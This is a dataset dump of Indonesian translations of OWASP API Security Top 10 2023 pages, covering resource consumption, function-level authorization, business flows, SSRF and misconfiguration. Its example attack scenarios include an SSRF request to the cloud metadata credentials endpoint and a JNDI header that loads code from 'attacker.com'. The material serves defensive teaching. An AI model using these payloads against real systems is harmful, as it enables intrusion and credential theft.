seperti `to_json()` dan `to_string()`. Sebaliknya, pilih properti obyek tertentu yang ingin Anda kembalikan.  \n* Jika memungkinkan, hindari menggunakan fungsi yang secara otomatis mengikat input klien ke dalam variabel kode, obyek internal, atau properti obyek (\"Penugasan Massal\").\n* Izinkan perubahan hanya pada properti obyek yang seharusnya diperbarui oleh klien.\n* Terapkan mekanisme validasi respons berbasis skema sebagai lapisan keamanan tambahan. Sebagai bagian dari mekanisme ini, tentukan dan paksakan data yang dikembalikan oleh semua metode API.\n* Pertahankan struktur data yang dikembalikan seminimal mungkin, sesuai persyaratan bisnis/fungsional untuk endpoint tersebut.\n\n## Referensi\n\n### OWASP\n\n* [API3:2019 Paparan Data Berlebihan - OWASP API Security Top 10 2019][1]  \n* [API6:2019 - Penugasan Massal - OWASP API Security Top 10 2019][2]\n* [Cheat Sheet Penugasan Massal][3]\n\n### Eksternal\n\n* [CWE-213: Pengungkapan Informasi Sensitif karena Kebijakan yang Tidak Kompatibel][4]\n* [CWE-915: Modifikasi Atribut Objek yang Ditentukan Secara Dinamis yang Tidak Terkendali dengan Benar][5]\n\n[1]: https://owasp.org/API-Security/editions/2019/id/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/id/0xa6-mass-assignment/ \n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/213.html\n[5]: https://cwe.mitre.org/data/definitions/915.html\n\n", "timestamp": "2025-10-24T22:26:59.863014"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa4-unrestricted-resource-consumption.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa4-unrestricted-resource-consumption.md", "content": "# API4:2023 Konsumsi Sumber Daya yang Tidak Dibatasi\n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Rata-rata** dieksploitasi | **Luas** Prevalensi: **Mudah** Terdeteksi | **Parah** Teknis: Spesifik Bisnis |\n| Eksploitasi membutuhkan permintaan API sederhana. Beberapa permintaan serentak dapat dilakukan dari satu komputer lokal atau dengan menggunakan sumber daya komputasi cloud. Sebagian besar alat otomatis yang tersedia dirancang untuk menyebabkan DoS melalui beban lalu lintas tinggi, yang berdampak pada tingkat layanan API. | Umum ditemukan API yang tidak membatasi interaksi atau konsumsi sumber daya klien. Permintaan API yang dibuat, seperti yang mencakup parameter yang mengendalikan jumlah sumber daya yang akan dikembalikan dan melakukan analisis status/waktu/panjang respons seharusnya memungkinkan identifikasi masalah. Hal yang sama berlaku untuk operasi batch. Meskipun agen ancaman tidak memiliki visibilitas atas dampak biaya, ini dapat disimpulkan berdasarkan model bisnis/harga penyedia layanan (misalnya penyedia cloud). | Eksploitasi dapat menyebabkan DoS karena kekurangan sumber daya, tetapi juga dapat menyebabkan peningkatan biaya operasional seperti yang terkait dengan infrastruktur karena permintaan CPU yang lebih tinggi, peningkatan kebutuhan penyimpanan cloud, dll. |\n\n## Apakah API Rentan?\n\nMemenuhi permintaan API memerlukan sumber daya seperti bandwidth jaringan, CPU, memori, dan penyimpanan. Terkadang sumber daya yang diperlukan disediakan oleh penyedia layanan melalui integrasi API, dan dibayar berdasarkan permintaan, seperti mengirim email/SMS/panggilan telepon, validasi biometrik, dll.  \n\nAPI rentan jika setidaknya salah satu batasan berikut hilang atau diatur dengan tidak tepat (misalnya terlalu rendah/tinggi):\n\n* Batas waktu eksekusi\n* Memori maksimum yang dapat dialokasikan  \n* Jumlah maksimum deskriptor file\n* Jumlah proses maksimum\n* Ukuran file unggah maksimum\n* Jumlah operasi untuk dilakukan dalam satu permintaan klien API (misalnya penyuntingan batch GraphQL)\n* Jumlah catatan per halaman untuk dikembalikan dalam satu permintaan-respons\n* Batas biaya untuk layanan pihak ketiga \n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSebuah jejaring sosial mengimplementasikan alur \"lupa kata sandi\" menggunakan verifikasi SMS, hal ini memungkinkan pengguna menerima token sekali pakai melalui SMS untuk mereset kata sandi mereka.\n\nSetelah pengguna mengklik \"lupa kata sandi\" sebuah panggilan API dikirim dari browser pengguna ke API back-end:\n\n```\nPOST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\" \n}\n```\n\nKemudian, di balik layar, panggilan API dikirim dari back-end ke API pihak ke-3 yang mengurus pengiriman SMS:\n\n```\nPOST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n```\n\nPenyedia pihak ketiga, Willyo, membebankan $0,05 untuk setiap panggilan jenis ini.\n\nSeorang penyerang menulis skrip yang mengirim panggilan API pertama puluhan ribu kali. Back-end mengikuti dan meminta Willyo untuk mengirim puluhan ribu pesan teks, yang menyebabkan perusahaan kehilangan ribuan dolar dalam hitungan menit.\n\n### Skenario #2\n\nSebuah Endpoint API GraphQL memungkinkan pengguna mengunggah foto profil.\n\n```\nPOST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA...\\\") {\n      url\n    }\n  }\"\n}\n```\n\nBegitu proses unggah selesai, API menghasilkan beberapa thumbnail dengan ukuran berbeda berdasarkan gambar yang diunggah. Operasi grafis ini mengambil banyak memori server.\n\nAPI mengimplementasikan perlindungan pembatasan tradisional - pengguna tidak dapat mengakses endpoint GraphQL terlalu banyak dalam jangka waktu singkat. API juga memeriksa ukuran gambar yang diunggah sebelum menghasilkan thumbnail untuk menghindari memproses gambar yang terlalu besar. \n\nSeorang penyerang dapat dengan mudah mengatasi mekanisme tersebut, dengan memanfaatkan sifat fleksibel GraphQL:\n\n```\nPOST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA...\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA...\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FO IEFOR0xJVA...\\\") {url}}\"},  \n]\n```\n\nKarena API tidak membatasi berapa kali operasi `uploadPic` dapat dicoba, panggilan akan menyebabkan habisnya memori server dan Denial of Service.\n\n### Skenario #3\n\nSebuah penyedia layanan memungkinkan klien mengunduh file berukuran sebesar apa pun menggunakan API-nya. File-file ini disimpan di penyimpanan objek cloud dan jarang berubah. Penyedia layanan mengandalkan layanan cache agar memiliki tingkat layanan yang lebih baik dan menjaga konsumsi bandwidth tetap rendah. Layanan cache hanya menyimpan file hingga 15GB.\n\nKetika salah satu file diperbarui, ukurannya meningkat menjadi 18GB. Semua klien layanan segera mulai menarik versi baru. Karena tidak ada peringatan biaya konsumsi, atau pengeluaran maksimum yang diizinkan untuk layanan cloud, tagihan bulanan berikutnya meningkat dari rata-rata US$13 menjadi US$8 ribu.\n\n## Cara Mencegah\n\n* Gunakan solusi yang memudahkan pembatasan [memori][1], [CPU][2], [jumlah restart][3], [deskriptor file, dan proses][4] seperti Kontainer / Serverless code (misalnya Lambda).\n* Tentukan dan pastikan ukuran data maksimum pada semua parameter dan payload masukan, seperti panjang maksimum string, jumlah elemen maksimum array, dan ukuran file unggah maksimum (terlepas apakah disimpan secara lokal atau di penyimpanan cloud). \n* Terapkan batas seberapa sering klien dapat berinteraksi dengan API dalam rentang waktu tertentu (pembatasan laju).\n* Pembatasan laju harus diatur berdasarkan kebutuhan bisnis. Beberapa Endpoint API mungkin memerlukan kebijakan yang lebih ketat.  \n* Batasi/atur seberapa banyak atau seberapa sering satu klien/pengguna API dapat mengeksekusi operasi tunggal (misalnya memvalidasi OTP, atau meminta pemulihan kata sandi tanpa mengunjungi URL sekali pakai).\n* Tambahkan validasi sisi server yang tepat untuk parameter string kueri dan body permintaan, khususnya yang mengendalikan jumlah catatan yang akan dikembalikan dalam respons.\n* Konfigurasikan batas pengeluaran untuk semua penyedia layanan/integrasi API. Jika tidak memungkinkan untuk membatasi pengeluaran, sebaiknya konfigurasi peringatan tagihan.\n\n## Referensi\n\n### OWASP\n\n* [\"Ketersediaan\" - Cheat Sheet Keamanan Layanan Web][5]  \n* [\"Pencegahan DoS\" - Cheat Sheet GraphQL][6]\n* [\"Meredam Serangan Batching\" - Cheat Sheet GraphQL][7]  \n\n### Eksternal\n\n* [CWE-770: Alokasi Sumber Daya Tanpa Batasan atau Pengaturan][8] \n* [CWE-400: Konsumsi Sumber Daya yang Tidak Terkendali][9]\n* [CWE-799: Kontrol Interaksi Frekuensi yang Tidak Tepat][10]  \n* \"Pembatasan Laju (Pengaturan)\" - [Strategi Keamanan untuk Sistem Aplikasi Berbasis Mikroservis][11], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu  \n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#ulimit\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\n[7]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\n[8]: https://cwe.mitre.org/data/definitions/770.html \n[9]: https://cwe.mitre.org/data/definitions/400.html\n[10]: https://cwe.mitre.org/data/definitions/799.html\n[11]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\n\n", "timestamp": "2025-10-24T22:27:00.085521"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa5-broken-function-level-authorization.md", "content": "# API5:2023 Otorisasi Tingkat Fungsi yang Rusak\n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | **Umum** Prevalensi: **Mudah** Terdeteksi | **Parah** Teknis: Spesifik Bisnis |\n| Eksploitasi mengharuskan penyerang mengirim panggilan API yang sah ke endpoint API yang seharusnya tidak dapat mereka akses sebagai pengguna anonim atau pengguna biasa non-istimewa. Endpoint yang terpapar akan dengan mudah dieksploitasi. | Pemeriksaan otorisasi untuk fungsi atau sumber daya biasanya dikelola melalui konfigurasi atau level kode. Menerapkan pemeriksaan yang tepat dapat menjadi tugas yang membingungkan karena aplikasi modern dapat terdiri dari banyak jenis peran, grup, dan hierarki pengguna yang kompleks (misalnya sub-pengguna, atau pengguna dengan lebih dari satu peran). Lebih mudah menemukan kelemahan ini di API karena API lebih terstruktur, dan mengakses fungsi yang berbeda lebih dapat diprediksi. | Kelemahan seperti itu memungkinkan penyerang mengakses fungsionalitas yang tidak sah. Fungsi administratif menjadi target utama untuk jenis serangan ini dan dapat menyebabkan pengungkapan data, kehilangan data, atau kerusakan data. Pada akhirnya, dapat menyebabkan gangguan layanan. |\n\n## Apakah API Rentan?\n\nCara terbaik untuk menemukan masalah otorisasi tingkat fungsi yang rusak adalah dengan melakukan analisis mendalam tentang mekanisme otorisasi dengan tetap mempertimbangkan hierarki pengguna, peran atau grup yang berbeda dalam aplikasi, dan mengajukan pertanyaan berikut:\n\n* Apakah pengguna reguler dapat mengakses endpoint administratif?\n* Apakah pengguna dapat melakukan tindakan sensitif (misalnya pembuatan, modifikasi, atau penghapusan) yang seharusnya tidak bisa diakses dengan hanya mengubah metode HTTP (misalnya dari `GET` ke `DELETE`)?  \n* Apakah pengguna dari grup X dapat mengakses fungsi yang seharusnya hanya dapat diakses pengguna dari grup Y, dengan hanya menebak URL endpoint dan parameternya (misalnya `/api/v1/users/export_all`)?\n\nJangan mengasumsikan bahwa sebuah endpoint API adalah endpoint reguler atau administratif hanya berdasarkan jalur URL-nya. \n\nMeskipun pengembang mungkin memilih untuk mengekspos sebagian besar endpoint administratif di path relatif tertentu, seperti `/api/admins`, sangat umum menemukan endpoint administratif ini di path relatif lain bersama dengan endpoint reguler, seperti `/api/users`.\n\n## Skenario Serangan Contoh  \n\n### Skenario #1\n\nSelama proses pendaftaran untuk aplikasi yang hanya mengizinkan pengguna yang diundang untuk bergabung, aplikasi seluler memicu panggilan API ke `GET /api/invites/{invite_guid}`. Respons berisi sebuah JSON dengan detail tentang undangan, termasuk peran pengguna dan email pengguna.\n\nSeorang penyerang menduplikasi permintaan dan memanipulasi metode HTTP dan endpoint menjadi `POST /api/invites/new`. Endpoint ini hanya boleh diakses oleh administrator menggunakan konsol admin. Endpoint tidak menerapkan pemeriksaan otorisasi tingkat fungsi. \n\nPenyerang mengeksploitasi masalah tersebut dan mengirim undangan baru dengan hak istimewa admin:\n\n```\nPOST /api/invites/new\n\n{\n  \"email\": \"attacker@somehost.com\",\n  \"role\":\"admin\" \n}\n```\n\nSelanjutnya, penyerang menggunakan undangan yang dibuat secara curang tersebut untuk membuat akun admin bagi dirinya sendiri dan mendapatkan akses penuh ke sistem.\n\n### Skenario #2\n\nSebuah API berisi endpoint yang seharusnya hanya terungkap ke administrator - `GET /api/admin/v1/users/all`. Endpoint ini mengembalikan detail semua pengguna aplikasi dan tidak menerapkan pemeriksaan otorisasi tingkat fungsi. Seorang penyerang yang mempelajari struktur API melakukan tebakan cerdas dan berhasil mengakses endpoint ini, yang mengekspos detail sensitif para pengguna aplikasi.\n\n## Cara Mencegah \n\nAplikasi Anda harus memiliki modul otorisasi yang konsisten dan mudah dianalisis yang dipanggil dari semua fungsi bisnis Anda. Seringkali, perlindungan seperti itu disediakan oleh satu atau lebih komponen eksternal untuk kode aplikasi.\n\n* Mekanisme penegakan harus menolak semua akses secara default, dibutuhkan hak akses yang eksplisit ke peran tertentu untuk mengakses setiap fungsi.\n* Tinjau endpoint API Anda terhadap kelemahan otorisasi tingkat fungsi, dengan tetap memperhatikan logika bisnis aplikasi dan hierarki grup.  \n* Pastikan semua pengendali administratif Anda mewarisi kendali abstrak administratif yang menerapkan pemeriksaan otorisasi berdasarkan grup/peran pengguna.\n* Pastikan fungsi administratif di dalam pengendali reguler menerapkan pemeriksaan otorisasi berdasarkan grup dan peran pengguna.\n\n## Referensi\n\n### OWASP\n\n* [Pemaksaan Penelusuran][1] \n* \"A7: Hilangnya Kendali Akses Tingkat Fungsi\", [OWASP Top 10 2013][2]\n* [Kontrol Akses][3]  \n\n### Eksternal\n\n* [CWE-285: Otorisasi yang Tidak Tepat][4]\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\n[3]: https://owasp.org/www-community/Access_Control \n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:27:00.288730"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa6-unrestricted-access-to-sensitive-business-flows.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa6-unrestricted-access-to-sensitive-business-flows.md", "content": "# API6:2023 Akses Tanpa Batas ke Aliran Bisnis Sensitif\n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | Prevalensi **Luas** : Terdeteksi **Rata-rata** | Teknis **Sedang** : Spesifik Bisnis |\n| Eksploitasi biasanya melibatkan pemahaman model bisnis yang didukung oleh API, menemukan aliran bisnis sensitif, dan mengotomatisasi akses ke aliran tersebut, yang merugikan bisnis. | Kurangnya pandangan holistik tentang API untuk sepenuhnya mendukung persyaratan bisnis cenderung berkontribusi pada prevalensi masalah ini. Penyerang secara manual mengidentifikasi sumber daya (misalnya endpoint) apa yang terlibat dalam alur kerja target dan bagaimana mereka bekerja sama. Jika mekanisme mitigasi sudah ada, penyerang perlu menemukan cara untuk melewatinya. | Secara umum, dampak teknis tidak diharapkan. Eksploitasi mungkin merugikan bisnis dengan berbagai cara, misalnya: mencegah pengguna sah membeli produk, atau menyebabkan inflasi dalam perekonomian internal sebuah game. |\n\n## Apakah API Rentan?\n\nSaat membuat Endpoint API, penting untuk memahami aliran bisnis apa yang dieksposnya. Beberapa aliran bisnis lebih sensitif daripada yang lain, dalam artian akses berlebihan ke dalamnya dapat merugikan bisnis. \n\nContoh umum aliran bisnis sensitif dan risiko akses berlebihan yang terkait dengannya:\n\n* Aliran pembelian produk - seorang penyerang dapat membeli semua persediaan item yang sangat diminati secara sekaligus dan menjual kembali dengan harga yang lebih tinggi (penimbunan)\n* Aliran membuat komentar/posting - seorang penyerang dapat men-spam sistem  \n* Melakukan reservasi - seorang penyerang dapat memesan semua slot waktu yang tersedia dan mencegah pengguna lain menggunakan sistem\n\nRisiko akses berlebihan mungkin berubah antar industri dan bisnis. Misalnya - pembuatan post oleh skrip mungkin dianggap sebagai risiko spam oleh satu jejaring sosial, tetapi didorong oleh jejaring sosial lainnya.\n\nSebuah Endpoint API rentan jika mengekspos aliran bisnis sensitif, tanpa membatasi akses ke dalamnya dengan tepat.\n\n## Contoh Skenario Serangan\n\n### Skenario #1  \n\nSebuah perusahaan teknologi mengumumkan akan merilis konsol game baru di hari Thanksgiving. Produk ini memiliki permintaan yang sangat tinggi dan persediaannya terbatas. Seorang penyerang menulis kode untuk secara otomatis membeli produk baru dan menyelesaikan transaksi. \n\nPada hari rilis, penyerang menjalankan kode yang didistribusikan di berbagai alamat IP dan lokasi. API tidak menerapkan perlindungan yang tepat dan memungkinkan penyerang untuk membeli sebagian besar persediaan sebelum pengguna sah lainnya. \n\nKemudian, penyerang menjual produk di platform lain dengan harga jauh lebih tinggi.\n\n### Skenario #2\n\nSebuah maskapai penerbangan menawarkan pembelian tiket online tanpa biaya pembatalan. Seorang pengguna dengan niat jahat memesan 90% kursi penerbangan yang diinginkan.\n\nBeberapa hari sebelum penerbangan pengguna jahat membatalkan semua tiket sekaligus, yang memaksa maskapai untuk memberikan diskon harga tiket untuk mengisi penerbangan. \n\nPada titik ini, pengguna membeli satu tiket untuk dirinya sendiri yang jauh lebih murah dari yang asli.\n\n### Skenario #3  \n\nSebuah aplikasi ride-sharing menyediakan program referral - pengguna dapat mengundang teman mereka dan mendapatkan kredit untuk setiap teman yang bergabung dengan aplikasi. Kredit ini kemudian dapat digunakan sebagai uang tunai untuk memesan tumpangan.\n\nSeorang penyerang mengeksploitasi alur ini dengan menulis skrip untuk mengotomatisasi proses pendaftaran, dengan setiap pengguna baru menambahkan kredit ke dompet penyerang. \n\nPenyerang kemudian dapat menikmati tumpangan gratis atau menjual akun dengan kredit berlebihan untuk uang tunai.\n\n## Cara Mencegah\n\nPerencanaan mitigasi harus dilakukan dalam dua lapisan:\n\n* Bisnis - identifikasi aliran bisnis yang mungkin merugikan bisnis jika digunakan secara berlebihan.\n* Rekayasa - pilih mekanisme perlindungan yang tepat untuk memitigasi risiko bisnis.\n\n    Beberapa mekanisme perlindungan lebih sederhana sementara yang lain lebih sulit diterapkan. Metode berikut digunakan untuk memperlambat ancaman otomatis:\n\n    * Fingerprinting perangkat: menolak layanan ke perangkat klien yang tidak diharapkan (misalnya headless browser) cenderung membuat aktor ancaman menggunakan solusi yang lebih canggih, sehingga lebih mahal bagi mereka\n    * Deteksi manusia: menggunakan captcha atau solusi biometrik tingkat lanjut (misalnya pola pengetikan)\n    * Pola non-manusia: menganalisis alur pengguna untuk mendeteksi pola non-manusia (misalnya pengguna mengakses fungsi \"tambah ke keranjang\" dan \"selesaikan pembelian\" dalam waktu kurang dari satu detik)\n    * Pertimbangkan memblokir alamat IP dari node keluar Tor dan proxy terkenal\n\n  Amankan dan batasi akses ke API yang dikonsumsi langsung oleh mesin (seperti API pengembang dan B2B). Mereka cenderung menjadi target yang mudah bagi penyerang karena seringkali tidak menerapkan semua mekanisme perlindungan yang diperlukan.\n  \n## Referensi\n\n### OWASP\n\n* [OWASP Ancaman Otomatis ke Aplikasi Web][1]  \n* [API10:2019 Pencatatan & Pemantauan yang Tidak Memadai][2]\n\n[1]: https://owasp.org/www-project-automated-threats-to-web-applications/\n[2]: https://owasp.org/API-Security/editions/2019/id/0xaa-insufficient-logging-monitoring/\n", "timestamp": "2025-10-24T22:27:00.396429"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa7-server-side-request-forgery.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa7-server-side-request-forgery.md", "content": "# API7:2023 Pemalsuan Permintaan Sisi Server \n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | Prevalensi **Umum** : **Mudah** Terdeteksi | Teknis **Sedang** : Spesifik Bisnis |  \n| Eksploitasi membutuhkan penyerang untuk menemukan endpoint API yang mengakses URI yang disediakan oleh klien. Secara umum, SSRF dasar (saat respons dikembalikan ke penyerang) lebih mudah dieksploitasi daripada Blind SSRF ketika penyerang tidak menerima informasi apakah serangan berhasil atau tidak. | Konsep modern dalam pengembangan aplikasi mendorong pengembang untuk mengakses URI yang disediakan oleh klien. Kurangnya atau validasi yang tidak tepat dari URI tersebut adalah masalah yang umum. Permintaan dan analisis respons API reguler akan dibutuhkan untuk mendeteksi masalah tersebut. Ketika respons tidak dikembalikan (Blind SSRF) mendeteksi kerentanan membutuhkan lebih banyak upaya dan kreativitas. | Eksploitasi yang berhasil mungkin mengarah ke enumerasi layanan internal (misalnya pemindaian port), pengungkapan informasi, menghindari firewall, atau mekanisme keamanan lainnya. Dalam beberapa kasus, dapat mengarah ke DoS atau server digunakan sebagai proxy untuk menyembunyikan kegiatan berbahaya. |\n\n## Apakah API Rentan?\n\nCelah Pemalsuan Permintaan Sisi Server (SSRF) terjadi ketika API mengambil sumber daya jarak jauh tanpa memvalidasi URL yang diberikan pengguna. Hal ini memungkinkan penyerang memaksa aplikasi untuk mengirim permintaan yang dibuat ke tujuan yang tidak terduga, bahkan ketika dilindungi oleh firewall atau VPN.\n\nKonsep modern dalam pengembangan aplikasi membuat SSRF lebih umum dan lebih berbahaya. \n\nLebih umum - konsep berikut mendorong pengembang untuk mengakses sumber daya eksternal berdasarkan masukan pengguna: Webhook, mengambil file dari URL, SSO kustom, dan pratinjau URL.\n\nLebih berbahaya - Teknologi modern seperti penyedia cloud, Kubernetes, dan Docker mengekspos saluran manajemen dan kontrol melalui HTTP pada jalur yang dapat diprediksi dan dikenal dengan baik. Saluran tersebut adalah target yang mudah untuk serangan SSRF. \n\nJuga lebih menantang untuk membatasi lalu lintas keluar aplikasi Anda, karena sifat terhubung aplikasi modern.\n\nRisiko SSRF tidak selalu dapat sepenuhnya dihilangkan. Saat memilih mekanisme perlindungan, penting untuk mempertimbangkan risiko bisnis dan kebutuhan.\n\n## Contoh Skenario Serangan\n\n### Skenario #1\n\nSebuah jejaring sosial memungkinkan pengguna mengunggah foto profil. Pengguna dapat memilih untuk mengunggah file gambar dari mesin mereka, atau menyediakan URL gambar. Memilih opsi kedua, akan memicu panggilan API berikut:\n\n```\nPOST /api/profile/upload_picture \n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\" \n}\n```\n\nSeorang penyerang dapat mengirim URL berbahaya dan memulai pemindaian port di jaringan internal menggunakan Endpoint API.\n\n```\n{\n  \"picture_url\": \"localhost:8080\"\n}\n```\n\nBerdasarkan waktu respons, penyerang dapat mengetahui apakah port terbuka atau tidak. \n\n### Skenario #2\n\nSebuah produk keamanan menghasilkan peristiwa ketika mendeteksi anomali di jaringan. Beberapa tim lebih suka meninjau peristiwa dalam sistem pemantauan yang lebih luas dan generik, seperti SIEM (Security Information and Event Management). Untuk tujuan ini, produk menyediakan integrasi dengan sistem lain menggunakan webhook.\n\nSebagai bagian dari pembuatan webhook baru, mutasi GraphQL dikirim dengan URL API SIEM.\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://www.siem-system.com/create_new_event\\\",\n              send_test_req: true\n            }\n          ]\n    \t  }\n  \t  }){\n    \tchannelId\n  \t}\n\t}\"\n  }\n]\n\n```\n\nSelama proses pembuatan, back-end API mengirim permintaan uji ke URL webhook yang diberikan, dan menyajikan respons ke pengguna. \n\nSeorang penyerang dapat memanfaatkan alur ini, dan membuat permintaan API untuk sumber daya sensitif, seperti layanan metadata cloud internal yang mengekspos kredensial:\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\\\",\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n```\n\nKarena aplikasi menampilkan respons dari permintaan uji, penyerang dapat melihat kredensial lingkungan cloud.\n\n## Cara Mencegah\n\n* Isolasi mekanisme pengambilan sumber daya di jaringan Anda: biasanya fitur ini bertujuan untuk mengambil sumber daya jarak jauh dan bukan internal.\n* Kapan pun memungkinkan, gunakan allow list untuk:\n    * Asal lokasi sumber daya (misalnya Google Drive, Gravatar, dll.) yang diharapkan digunakan pengguna untuk mengunduh sumber daya\n    * Skema URL dan port\n    * Jenis media yang diterima untuk fungsionalitas tertentu\n* Nonaktifkan pengalihan HTTP. \n* Gunakan parser URL yang diuji dan dikelola dengan baik untuk menghindari masalah yang disebabkan oleh inkonsistensi parsing URL.\n* Validasi dan bersihkan semua data input yang diberikan klien.  \n* Jangan kirim respons mentah ke klien.\n\n## Referensi\n\n### OWASP\n\n* [Server Side Request Forgery][1]\n* [Server-Side Request Forgery Prevention Cheat Sheet][2]\n\n### Eksternal\n\n* [CWE-918: Server-Side Request Forgery (SSRF)][3]\n* [URL confusion vulnerabilities in the wild: Exploring parser inconsistencies,\n   Snyk][4]\n\n[1]: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/918.html\n[4]: https://snyk.io/blog/url-confusion-vulnerabilities/\n", "timestamp": "2025-10-24T22:27:00.516529"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa8-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa8-security-misconfiguration.md", "content": "# API8:2023 Miskonfigurasi Keamanan\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Luas** : Kemungkinan Dideteksi **Mudah** | Teknis **Parah** : Khusus Bisnis |\n| Penyerang sering mencoba menemukan kelemahan yang belum diperbaiki, endpoint umum, layanan yang berjalan dengan konfigurasi default yang tidak aman, atau file dan direktori yang tidak terlindungi untuk mendapatkan akses tidak sah atau pengetahuan tentang sistem. Sebagian besar informasi ini adalah pengetahuan publik dan eksploitasi mungkin tersedia. | Kesalahan konfigurasi keamanan dapat terjadi di semua tingkat stack API, mulai dari tingkat jaringan hingga tingkat aplikasi. Alat otomatis tersedia untuk mendeteksi dan mengeksploitasi kesalahan konfigurasi seperti layanan yang tidak perlu atau opsi warisan. | Kesalahan konfigurasi keamanan tidak hanya mengekspos data pengguna yang sensitif, tetapi juga detail sistem yang dapat menyebabkan kompromi penuh server. |\n\n## Apakah API Rentan?\n\nAPI menjadi rentan bila:\n\n* Tidak ada penguncian keamanan yang sesuai di seluruh bagian stack API,\n  atau izin yang dikonfigurasi dengan tidak benar pada layanan cloud\n* Tidak ada patch keamanan terbaru, atau sistem sudah kadaluwarsa\n* Fitur yang tidak diperlukan diaktifkan (misalnya, verba HTTP, fitur logging)\n* Ada ketidaksesuaian dalam cara permintaan masuk diproses oleh server\n  dalam rantai server HTTP\n* Tidak ada Keamanan Lapisan Transportasi (TLS)\n* Direktif keamanan atau kendali cache tidak dikirimkan kepada klien\n* Kebijakan Cross-Origin Resource Sharing (CORS) hilang atau tidak diatur dengan tepat\n* Pesan kesalahan mencakup stack trace, atau mengekspos informasi sensitif lainnya\n\n## Contoh Skenario Serangan\n\n### Skenario #1\n\nSebuah server API back-end menjaga catatan akses yang ditulis oleh utilitas logging sumber terbuka pihak ketiga yang populer dengan dukungan ekspansi tempat dan pencarian JNDI\n(Java Naming and Directory Interface), keduanya diaktifkan secara default. Untuk\nsetiap permintaan, entri baru ditulis ke file log dengan pola berikut: `<metode> <versi_api>/<jalur> - <kode_status>`.\n\nPelaku jahat mengeluarkan permintaan API berikut, yang ditulis ke file log akses:\n\n```\nGET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n```\n\nKarena konfigurasi default yang tidak aman dari utilitas logging dan kebijakan keluar jaringan yang longgar, dalam rangka menulis entri yang sesuai\nke file log akses, sambil memperluas nilai dalam header permintaan `X-Api-Version`, utilitas logging akan mengambil dan menjalankan objek `Malicious.class` dari server yang dikendalikan oleh pelaku jahat.\n\n### Skenario #2\n\nSebuah situs jaringan sosial menawarkan fitur \"Pesan Langsung\" yang memungkinkan pengguna\nmempertahankan percakapan pribadi. Untuk mengambil pesan baru untuk percakapan tertentu, situs web mengeluarkan permintaan API berikut (interaksi pengguna tidak diperlukan):\n\n```\nGET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA\n```\n\nKarena tanggapan API 